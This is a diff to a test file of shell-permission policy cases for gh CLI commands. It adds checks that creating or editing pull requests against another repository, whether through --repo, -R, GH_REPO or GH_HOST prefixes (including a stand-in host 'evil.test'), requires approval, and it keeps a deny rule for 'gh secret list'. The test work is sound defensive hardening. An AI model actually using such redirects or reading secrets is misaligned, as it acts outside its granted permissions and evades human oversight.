@@ -589,6 +589,23 @@ SHELL_POLICY_CASES = [
     DecisionCase(input="gh api -X POST /repos", effect="ask"),
     DecisionCase(input="gh issue create --title x", effect="ask"),
     DecisionCase(input="gh pr checkout 123", effect="allow"),
+    # Authoring allows because the work is the author's own and the branch is
+    # already pushed — both claims about this repository, and `--repo` is what
+    # makes them someone else's. Reading elsewhere keeps its grant.
+    DecisionCase(input="gh pr create --fill", effect="allow"),
+    DecisionCase(input="gh pr create --repo other/victim --fill", effect="ask"),
+    DecisionCase(input="gh pr create -R other/victim --fill", effect="ask"),
+    DecisionCase(input="gh pr edit -R other/victim --title x", effect="ask"),
+    DecisionCase(input="gh pr ready -R other/victim", effect="ask"),
+    DecisionCase(input="gh pr list -R other/repo", effect="allow"),
+    DecisionCase(input="gh pr view -R other/repo 1", effect="allow"),
+    # The flag is not the only spelling of the redirect, so guarding it alone
+    # would leave the same pull request one word away. `GH_` joins `GIT_` as a
+    # prefix rather than a list of names, which fails closed on the next
+    # variable gh learns to read.
+    DecisionCase(input="GH_REPO=other/victim gh pr create --fill", effect="ask"),
+    DecisionCase(input="env GH_REPO=other/victim gh pr create --fill", effect="ask"),
+    DecisionCase(input="GH_HOST=evil.test gh pr create --fill", effect="ask"),
     DecisionCase(input="gh auth status", effect="allow"),
     DecisionCase(input="gh secret list", effect="deny"),
     # Adversarial hardening: no auto-allowed code execution or injection.
